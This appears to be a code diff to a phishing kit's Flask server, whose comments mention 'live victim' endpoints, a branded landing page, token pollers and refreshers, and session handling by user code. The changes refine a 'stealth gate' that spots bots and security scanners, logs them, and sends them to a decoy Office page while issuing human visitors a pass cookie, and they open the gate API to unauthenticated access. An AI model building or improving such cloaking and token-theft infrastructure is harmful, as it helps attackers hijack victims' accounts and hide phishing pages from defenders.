@@ -21,7 +21,10 @@ from poller import TokenPoller
 from refresher import TokenRefresher
 from landing import CRIMSON_PAW_LANDING_HTML
 import keyword_watcher
-from core.stealth_gate import require_human_gate, generate_gate_token, verify_gate_token, is_known_bot, log_bot_hit, generate_op_test_token
+from core.stealth_gate import (
+    require_human_gate, generate_gate_token, verify_gate_token, is_known_bot, 
+    log_bot_hit, generate_op_test_token, get_fallback_url, get_client_ip
+)
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
@@ -13238,6 +13241,7 @@ def require_admin_login():
     # 3. Allow all live victim, deployment, and mock preview endpoints (must NEVER be blocked!)
     if (request.path.startswith('/lp/') or 
         request.path.startswith('/api/lp/') or 
+        request.path.startswith('/api/gate/') or 
         request.path.startswith('/api/lg/preview/') or 
         request.path.startswith('/sandbox/') or 
         request.path == '/favicon.ico' or 
@@ -13576,16 +13580,18 @@ def api_gate_verify():
     data = request.json or {}
     is_bot = data.get('is_bot', False)
     target = data.get('target', '/')
-    client_ip = request.headers.get('CF-Connecting-IP') or request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+    client_ip = get_client_ip(request)
     user_agent = request.headers.get('User-Agent', '')
 
+    fallback = get_fallback_url()
     if is_bot or not client_ip or is_known_bot(user_agent):
         log_bot_hit(client_ip or request.remote_addr, user_agent, bot_type="js_diagnostic_fail" if is_bot else "scanner", host=request.host, path=target)
-        return jsonify({'success': False, 'redirect': getattr(Config, 'FALLBACK_URL', 'https://www.office.com/')})
+        return jsonify({'success': False, 'redirect': fallback})
 
     token = generate_gate_token(client_ip, user_agent)
     resp = jsonify({'success': True, 'redirect': target})
-    resp.set_cookie('gate_token', token, max_age=7200, httponly=True, samesite='Lax')
+    is_secure = request.is_secure or request.headers.get('X-Forwarded-Proto') == 'https'
+    resp.set_cookie('gate_token', token, max_age=7200, httponly=True, samesite='Lax', secure=is_secure, path='/')
     return resp
 
 @app.route('/api/sessions/<user_code>/expire', methods=['POST'])
